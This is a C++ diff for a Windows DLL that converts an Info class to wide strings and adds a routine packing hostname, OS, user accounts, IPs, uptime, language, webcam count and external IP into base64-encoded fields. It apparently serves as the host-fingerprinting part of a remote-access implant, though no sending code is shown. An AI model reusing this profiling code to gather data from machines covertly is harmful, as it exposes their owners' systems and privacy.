@@ -23,30 +23,35 @@
 
 #include "macro.h"
 #include "decoder.h"
+#include "base64.h"
+#include "xwebcam.h"
+#include "global.h"
 
 #include "memory_debug.h"
 
-std::string Info::getSid(){
+using namespace std;
+
+std::wstring Info::getSid(){
 	DWORD sidSize = 0;
-	TCHAR domain[1024] = {0};
+	wchar_t domain[1024] = {0};
 	DWORD domainSize = 1024;
 	SID_NAME_USE accountType;
 	LPTSTR cStringSid;
 
-	LPTSTR accountName = "";
+	LPTSTR accountName = L"";
 	// First we need the size of SID buffer
 	LookupAccountName(0, accountName, 0, &sidSize, domain, &domainSize, &accountType);
 	int *sid = new int[sidSize];
 	bool res = LookupAccountName(0, accountName, sid, &sidSize, domain, &domainSize, &accountType) != 0;
 	if (!res || !ConvertSidToStringSid(sid, &cStringSid)){
-		return "";
+		return L"";
 	}
 	return cStringSid;
 }
 
-std::string Info::getNameFromSid(const std::string sid){
-	char lpName[100];
-    char lpDomain[100];
+std::wstring Info::getNameFromSid(const std::wstring sid){
+	wchar_t lpName[100] = {0};
+	wchar_t lpDomain[100] = {0};
     PSID pSID = NULL;
 	DWORD dwSize = 100, dwResult = 0;
 	SID_NAME_USE SidType;
@@ -68,28 +73,28 @@ std::string Info::getNameFromSid(const std::string sid){
 
 EXTERN_C IMAGE_DOS_HEADER __ImageBase;
 
-std::string Info::getModulePath(){
-	CHAR   dllPath[512] = {0};
+std::wstring Info::getModulePath(){
+	wchar_t   dllPath[512] = {0};
 
 	GetModuleFileName((HINSTANCE)&__ImageBase, dllPath, _countof(dllPath));
 	return dllPath;
 }
 
-std::string Info::getModuleName(){
-	char fileName[MAX_PATH];
-	char fileNamePath [MAX_PATH];
+std::wstring Info::getModuleName(){
+	wchar_t fileName[MAX_PATH];
+	wchar_t fileNamePath [MAX_PATH];
 
 	GetModuleFileName((HINSTANCE)&__ImageBase, fileNamePath, MAX_PATH);
-	char *pch = strrchr(fileNamePath,'\\');
+	wchar_t *pch = wcsrchr(fileNamePath, '\\');
 
-	size_t length = strlen(pch);
+	size_t length = wcslen(pch);
 	for(size_t i = 0; i < length; i++)
 	{
 		*pch++;
 		fileName[i] = *pch;
 	}
 
-	std::string res(fileName);
+	std::wstring res(fileName);
 	return res;
 }
 
@@ -136,7 +141,7 @@ std::string Info::getAllIps(){
 	ZeroMemory( &hints, sizeof(hints) );
 	hints.ai_family = AF_UNSPEC;
 
-	TCHAR buffer[MAX_COMPUTERNAME_LENGTH + 1];
+	wchar_t buffer[MAX_COMPUTERNAME_LENGTH + 1];
 	DWORD size = MAX_COMPUTERNAME_LENGTH + 1;
 	if (GetComputerName(buffer, &size) == 0){
 		MYPRINTF("GetComputerName error: %d", WSAGetLastError());
@@ -170,8 +175,8 @@ std::string Info::getAllIps(){
 	return ips;
 }
 
-std::tstring Info::getWindowsLanguage(){
-	TCHAR szLang[256];
+std::wstring Info::getWindowsLanguage(){
+	wchar_t szLang[256];
 	if (GetLocaleInfo(LANG_SYSTEM_DEFAULT, LOCALE_SABBREVLANGNAME, szLang, 256) == 0){
 		MYPRINTF("GetLocaleInfo failed: %d\n", GetLastError());
 	}
@@ -179,7 +184,7 @@ std::tstring Info::getWindowsLanguage(){
 }
 
 
-std::tstring Info::getAllUsers(){
+std::wstring Info::getAllUsers(){
 	LPUSER_INFO_0 pBuf = NULL;
 	LPUSER_INFO_0 pTmpBuf;
 	DWORD dwLevel = 0;
@@ -257,7 +262,7 @@ std::tstring Info::getAllUsers(){
 	if (!res.empty()) {
 		res.pop_back();
 	}
-	std::string str(res.begin(), res.end());
+	std::wstring str(res.begin(), res.end());
 	return str;
 }
 
@@ -265,7 +270,7 @@ DWORD Info::getUptime(){
 	return GetTickCount();
 }
 
-bool Info::getComputerName(TCHAR *buffer, DWORD &size){
+bool Info::getComputerName(wchar_t *buffer, DWORD &size){
 	if (GetComputerName(buffer, &size) == 0){
 		MYPRINTF("GetComputerName error: %d", WSAGetLastError());
 		return false;
@@ -459,12 +464,12 @@ bool Info::getOSDisplayString( LPTSTR pszOS){
 
 		// Include service pack (if any) and build number.
 
-		if( strlen(osvi.szCSDVersion) > 0 )	{
+		if( wcslen(osvi.szCSDVersion) > 0 )	{
 			StringCchCat(pszOS, BUFSIZE, TEXT(" ") );
 			StringCchCat(pszOS, BUFSIZE, osvi.szCSDVersion);
 		}
 
-		TCHAR buf[80];
+		wchar_t buf[80];
 
 		StringCchPrintf( buf, 80, TEXT(" (build %d)"), osvi.dwBuildNumber);
 		StringCchCat(pszOS, BUFSIZE, buf);
@@ -485,7 +490,7 @@ bool Info::getOSDisplayString( LPTSTR pszOS){
 	}
 }
 
-std::tstring Info::getVersion(){
+std::wstring Info::getOsVersion(){
 
 	OSVERSIONINFO osvi;
 
@@ -494,16 +499,16 @@ std::tstring Info::getVersion(){
 
 	GetVersionEx(&osvi);
 
-	TCHAR buffer[256];
-	sprintf_s(buffer, 256, TEXT("%u.%u.%u.%s"), osvi.dwMajorVersion, osvi.dwMinorVersion, osvi.dwBuildNumber, osvi.szCSDVersion);
+	wchar_t buffer[256];
+	swprintf_s(buffer, 256, TEXT("%u.%u.%u.%s"), osvi.dwMajorVersion, osvi.dwMinorVersion, osvi.dwBuildNumber, osvi.szCSDVersion);
 
-	std::tstring s = buffer;
+	std::wstring s = buffer;
 
 	return s;
 }
 
 
-std::tstring Info::getProcessor(){
+std::wstring Info::getProcessor(){
 	SYSTEM_INFO systemInfo;
 	ZeroMemory(&systemInfo, sizeof(SYSTEM_INFO));
 	PGNSI pGNSI;
@@ -513,44 +518,83 @@ std::tstring Info::getProcessor(){
 	} else {
 		GetSystemInfo(&systemInfo);
 	}
-	TCHAR buffer[256];
-	sprintf_s(buffer, 256, TEXT("%s %u"), systemInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64 ? "64" : "32", systemInfo.dwNumberOfProcessors);
+	wchar_t buffer[256];
+	swprintf_s(buffer, 256, TEXT("%s %u"), systemInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64 ? L"64" : L"32", systemInfo.dwNumberOfProcessors);
 
-	std::tstring s = buffer;
+	std::wstring s = buffer;
 
 	return s;
 }
 
-std::string Info::getAllInfos(){
-    TCHAR buffer[MAX_COMPUTERNAME_LENGTH + 1];
+std::wstring Info::getAllInfos(){
+    wchar_t buffer[MAX_COMPUTERNAME_LENGTH + 1];
     DWORD size = MAX_COMPUTERNAME_LENGTH + 1;
 
-	std::string res;
+	std::wstring res;
 
     if (getComputerName(buffer, size)){
-		res.append("c=").append(Decoder::simpleEncode(buffer));
+		res.append(L"c=").append(Decoder::simpleEncode(buffer));
     } else {
         MYPRINTF("Unable to retrieve computer name\n");
     }
 
-	res.append("&o=").append(Decoder::simpleEncode(getVersion()));
+	res.append(L"&o=").append(Decoder::simpleEncode(getOsVersion()));
 
-    TCHAR os[256];
+    wchar_t os[256];
     if (getOSDisplayString(os)){
-		res.append("&s=").append(Decoder::simpleEncode(os));
+		res.append(L"&s=").append(Decoder::simpleEncode(os));
     }
 
-	res.append("&p=").append(Decoder::simpleEncode(getProcessor()));
+	res.append(L"&p=").append(Decoder::simpleEncode(getProcessor()));
 
-	res.append("&u=").append(Decoder::simpleEncode(getAllUsers()));
+	res.append(L"&u=").append(Decoder::simpleEncode(getAllUsers()));
 
-	std::ostringstream oss;
-	oss << getUptime() / (1000 * 60);
-	res.append("&t=").append(oss.str());
+	std::wstring s = std::to_wstring((long double)(getUptime() / (1000 * 60)));
+	res.append(L"&t=").append(s);
 
-	res.append("&a=").append(Decoder::simpleEncode(getAllIps()));
+	res.append(L"&a=").append(Decoder::simpleEncode(getAllIps()));
 
-	res.append("&l=").append(Decoder::simpleEncode(getWindowsLanguage()));
+	res.append(L"&l=").append(Decoder::simpleEncode(getWindowsLanguage()));
+
+	return res;
+}
+
+std::wstring Info::getAllInfosAsString(){
+    wchar_t buffer[MAX_COMPUTERNAME_LENGTH + 1];
+    DWORD size = MAX_COMPUTERNAME_LENGTH + 1;
+
+	std::wstring res;
+	Base64 b64;
+
+    if (getComputerName(buffer, size)){
+		res.append(L" hostname:").append(b64.encodeString(wstring(buffer)));
+    } else {
+        MYPRINTF("Unable to retrieve computer name\n");
+    }
+
+	res.append(L" osversion:").append(b64.encodeString(getOsVersion()));
+
+    wchar_t os[256];
+    if (getOSDisplayString(os)){
+		res.append(L" os:").append(b64.encodeString(os));
+    }
+
+	res.append(L" processor:").append(b64.encodeString(getProcessor()));
+
+	res.append(L" users:").append(b64.encodeString(getAllUsers()));
+
+	std::wstring s = std::to_wstring((long double)(getUptime() / (1000 * 60)));
+	res.append(L" uptime:").append(s);
+
+	res.append(L" ips:").append(b64.encodeString(tosW(getAllIps())));
+
+	res.append(L" language:").append(b64.encodeString(getWindowsLanguage()));
+
+	XWebcam cam;
+	res.append(L" cam:").append(lToW(cam.webcamCount()));
+
+	string internet = Global::get().getInternetIp();
+	res.append(L" internet:").append(b64.encodeString(tosW(internet)));
 
 	return res;
 }
